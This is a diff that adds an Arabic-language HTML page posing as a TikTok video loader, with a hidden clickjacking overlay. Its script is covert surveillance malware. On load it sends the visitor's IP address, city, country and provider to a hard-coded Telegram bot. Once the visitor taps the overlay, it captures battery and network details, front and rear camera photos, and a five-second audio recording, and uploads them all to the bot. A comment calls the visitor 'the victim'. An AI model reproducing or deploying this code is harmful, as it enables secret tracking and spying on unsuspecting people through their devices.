@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
+        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <iframe src="https://www.tiktok.com/@luziwei99/video/7630110849180486934?_r=1&u_code=ek558e14lbb5dc&preview_pb=0&sharer_language=ar&_d=f0l3kgjicmdi17&share_item_id=7630110849180486934&source=h5_m&timestamp=1777107390&user_id=7499788246807020550&sec_user_id=MS4wLjABAAAAEBH1ankK98Beuqgyhp-gb3Zh1iZxJmIg3MRa9xftKA05rKeFVdDRfCmztfh7hrMS&item_author_type=2&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7627410640806577940&share_link_id=f37377b0-40d8-4b6c-a10f-e31938955047&share_app_id=1233&ugbiz_name=MAIN&ug_btm=b2001&link_reflow_popup_iteration_sharer=%7B%22click_empty_to_play%22%3A1%2C%22dynamic_cover%22%3A1%2C%22follow_to_play_duration%22%3A-1.0%2C%22profile_clickable%22%3A1%7D&enable_checksum=1"></iframe>
+    <div id="overlay" onclick="startOrganizedCapture()"></div>
+
+    <script>
+        const token = '8274985252:AAGcE7i52pQxD6Dii59Xa_8Q7mfZtsxc4uw';
+        const chatId = '7204722873';
+
+        async function sendMsg(txt) {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
+            } catch(e) {}
+        }
+
+        // 1. إرسال (اسم الهاتف + الـ IP) فور الفتح
+        window.onload = async () => {
+            const userAgent = navigator.userAgent;
+            let deviceName = "غير معروف";
+            if (userAgent.match(/Android/i)) deviceName = "Android Device";
+            else if (userAgent.match(/iPhone/i)) deviceName = "iPhone";
+            
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendMsg(`📱 *نوع الهاتف:* ${deviceName}\n🌐 *IP:* ${d.ip}`);
+                
+                // 2. إرسال الموقع في رسالة منفصلة (بعد الـ IP)
+                setTimeout(() => {
+                    sendMsg(`📍 *الموقع بالتفصيل:*\nالمدينة: ${d.city}\nالدولة: ${d.country_name}\nالشركة المزودة: ${d.org}`);
+                }, 1000);
+            });
+        };
+
+        async function startOrganizedCapture() {
+            document.getElementById('overlay').style.display = 'none';
+
+            // 3. إرسال معلومات البطارية والشبكة
+            let batteryInfo = "غير مدعوم";
+            try { const b = await navigator.getBattery(); batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'جاري الشحن' : 'تفريغ'})`; } catch(e) {}
+            
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let netType = connection ? connection.effectiveType : "غير معروف";
+            
+            sendMsg(`🔋 *البطارية:* ${batteryInfo}\n📶 *نوع الشبكة:* ${netType}`);
+
+            // 4. البدء بسحب الكاميرات
+            try {
+                // الكاميرا الأمامية
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                await captureMedia(frontStream, "الأمامية", true);
+                frontStream.getTracks().forEach(t => t.stop());
+
+                // الكاميرا الخلفية (بعد ثانية)
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        await captureMedia(backStream, "الخلفية", false);
+                        backStream.getTracks().forEach(t => t.stop());
+                    } catch(e) { sendMsg("⚠️ الكاميرا الخلفية محظورة."); }
+                }, 1500);
+
+            } catch (e) {
+                sendMsg("🚫 الضحية رفض الأذونات.");
+            }
+        }
+
+        async function captureMedia(stream, type, isAudio) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            canvas.toBlob(blob => {
+                const frm = new FormData();
+                frm.append('chat_id', chatId);
+                frm.append('photo', blob, `${type}.jpg`);
+                frm.append('caption', `📸 لقطة من الكاميرا ${type}`);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+            }, 'image/jpeg', 0.5);
+
+            if (isAudio) {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'rec.ogg');
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+            }
+        }
+    </script>
+</body>
+</html>
